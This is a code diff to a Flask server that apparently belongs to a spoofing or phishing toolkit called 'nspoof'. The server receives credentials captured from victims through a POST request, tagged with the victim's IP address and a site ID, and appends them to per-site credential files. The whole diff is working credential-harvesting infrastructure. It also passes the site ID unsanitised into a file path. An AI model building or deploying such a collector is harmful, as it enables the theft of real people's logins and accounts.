@@ -1,24 +1,43 @@
 from flask import Flask, request
-import sys
 import os
-import pdb
-import csv
-
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'utils')))
+import ast
+import sys
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from environment import *
-from csveditor import update_csv_with_json
 
+# Creating Flask app
 app = Flask(__name__)
 
-file_path = os.path.abspath(__file__)
-directory = os.path.dirname(file_path)
+#
+# Function for adding catched credentials to credfile
+# 
+def add_credentials_to_file(credentials, file_path, ip_victim):
 
-ENV['nspoof_location'] = directory + "/.."
+    dict_obj = ast.literal_eval(credentials)
 
-@app.route('/', methods=['GET', 'POST', 'PUT', 'DELETE'])
+    try:
+
+        formatted_line = ip_victim + " --- " + "; ".join([f"{key}='{value}'" for key, value in dict_obj.items()]) + ";\n"
+
+        with open(file_path, mode='a', encoding='utf-8') as file:
+            file.write(formatted_line)
+
+        return {"message": "Data successfully added"}, 200
+
+    except Exception as e:
+        print(e);
+        return {"message": f"An error occurred: {str(e)}"}, 500
+
+#
+# Handler
+#
+@app.route('/', methods=['POST'])
 def handle_request():
+
+    # Only treat POST requests
     if request.method == 'POST':
+
+        # Check if request is JSON
         if request.is_json:
             data = request.get_json()
             site_id = data.get('site_id')
@@ -29,27 +48,20 @@ def handle_request():
             credentials = request.form.get('credentials')
             ip_victim = request.form.get('ip_victim')
 
+        # Check if site_id, victim_id and credentials are submitted
+        if not site_id or not credentials or not ip_victim:
+            return {"error": "Missing site_id or credentials"}, 400
 
-        print(site_id, credentials, ip_victim)
-        print("----------------------------------------------")
+        # Evaluate (new) file path and call the add function
+        file_path = os.path.join(ENV['nspoof_location'] + "/credentials", f"{site_id}")
+        add_credentials_to_file(credentials, file_path, ip_victim);
 
-        csv_file_path = ENV['nspoof_location'] + "/credentials/" + str(site_id) + ".csv"
-        folder_path = os.path.dirname(csv_file_path)
+        # Return a success response
+        return {"message": "Data successfully added"}, 200
 
-        if not os.path.exists(folder_path):
-            os.makedirs(folder_path)
+    # By default return an invalid response
+    return {"error": "Invalid request method"}, 405
 
-        if not os.path.isfile(csv_file_path):
-            with open(csv_file_path, mode='w', newline='', encoding='utf-8') as csvfile:
-                writer = csv.writer(csvfile)
-                writer.writerow([])  # Écrire une ligne vide pour l'entête
-
-        update_csv_with_json(csv_file_path, credentials)
-        print(credentials)
-
-        return {}, 200
-
-    return {}, 405
-
-sys.stdout.flush()
-app.run(host='0.0.0.0', port=4000, threaded=True)
+# Launch server
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=4000, threaded=True)
